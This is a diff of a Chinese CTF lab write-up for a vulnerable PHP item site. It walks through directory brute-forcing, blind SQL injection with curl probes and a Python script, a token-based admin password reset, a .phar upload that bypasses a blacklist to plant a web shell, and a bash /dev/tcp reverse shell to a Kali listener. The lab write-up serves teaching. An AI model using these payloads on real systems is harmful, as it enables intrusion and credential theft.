@@ -38,7 +38,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 ### 利用 gobuster 爆破出网站源代码.zip
-web 页面提示 `Our website is under construction!`=`我们的网站正在建设中！`
+web 页面提示 `Our website is under construction!`,`我们的网站正在建设中!`.
 
 使用gobuster
 ```bash
@@ -68,9 +68,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /asset                (Status: 301) [Size: 310] [--> http://172.16.1.65/asset/]  
 /source_code.zip      (Status: 200) [Size: 5275298]
 ```
+
  发现 `source_code.zip`
  
  使用`wget`下载文件
+ 
  ```shell
  $ wget http://172.16.1.65/source_code.zip
  ```
@@ -78,12 +80,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  接下来就是代码审计了
  
 `/item/`目录下的文件存在以下内容的都需要登录才能访问
+
 ```php
 include "../include/isAuthenticated.php";
 ```
 
 而这个文件没有，而且存在sql injection
+
  `/item/viewItem.php` 内容
+ 
  ```php
 <?php
 
@@ -113,11 +118,14 @@ if(isset($result['id'])){
 
 ?>
 ```
- 默认访问 302跳转到 `../login/login.php`
+
+默认访问 302跳转到 `../login/login.php`
+ 
  下面的代码大概就GET传进去一个id 如果sql 语句查询到结果则返回状态码404
  
  
  > 接下来的sql注入结果主要看返回状态码
+ 
 ```shell
 $ curl "http://172.16.1.65/item/viewItem.php?id=1" -v
 # 响应状态码 404
@@ -131,10 +139,12 @@ $ curl "http://172.16.1.65/item/viewItem.php?id=-1+or+1=1" -v
 $ curl "http://172.16.1.65/item/viewItem.php?id=-1+or+1=2" -v
 # 响应状态码 404
 ```
+
 > 经过测试验证，SQL 注入无疑
 > 接下使用slqmap 或者写脚本
 
 # sql-injection-python-script
+
 ```python
 import requests
 import binascii
@@ -193,11 +203,14 @@ pay = "select group_concat(token) from user"
 exp(pay)
 # 查看token字段
 ```
+
 一开始 使用sql注入得到的密码登录不成功
 得到的密码是密文，而验证时需要MD5加密后的，这样肯定不能登录
+
 `unaccessable_until_you_change_me,unaccessable_until_you_change_me`
 
  生成token的代码在`/login/resetPassword.php`
+ 
 ```php
 function generateToken(){
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
@@ -265,9 +278,13 @@ $# echo -n "newpass" |openssl md5
 # 结果意料之中
 
 ```
+
 密码重置成功
+
 `admin`:`newpass`
+
 进行后台登录，在后台管理页面得到`FLAG1`
+
 ```shell
 FLAG1: 0410e2bd77f66dc9a567ab00aa29599cd 
 ```
@@ -278,12 +295,14 @@ FLAG1: 0410e2bd77f66dc9a567ab00aa29599cd
 > 进入后台->item->顺便编辑一个
 
 上传文件黑名单
+
 `"php", "phtml", "shtml", "cgi", "pl", "php3", "php4", "php5", "php6"`
 
 我们使用`.phar`后缀进行上传
 
 POST 上传数据
 > 如果需要复制使用，需要你修改`Cookie`和`HOST`
+
 ```bash
 POST /item/updateItem.php HTTP/1.1
 Host: 172.16.1.65
@@ -332,16 +351,19 @@ Content-Disposition: form-data; name="price"
 接下来反弹`shell`
 
 Kali:172.16.1.52
+
 ```shell
 $ nc -lvp 123
 ```
 
 然后访问
+
 ```bash
 http://172.16.1.65/item/image/mn.phar?cmd=bash -c "bash -i >%26 /dev/tcp/172.16.1.52/123 0>%261"
 ```
 
 kali
+
 ```bash
 root@kali:/opt# nc -lvp 123
 Ncat: Version 7.91 ( https://nmap.org/ncat )
@@ -367,6 +389,5 @@ FLAG2: 3599f5effdb3ed07d9a90a4ed19d13ad4
 
 www-data@secure:/var/www$
 ```
-`FLAG2`:`FLAG2: 3599f5effdb3ed07d9a90a4ed19d13ad4`
 
-# 
+`FLAG2`:`FLAG2: 3599f5effdb3ed07d9a90a4ed19d13ad4`
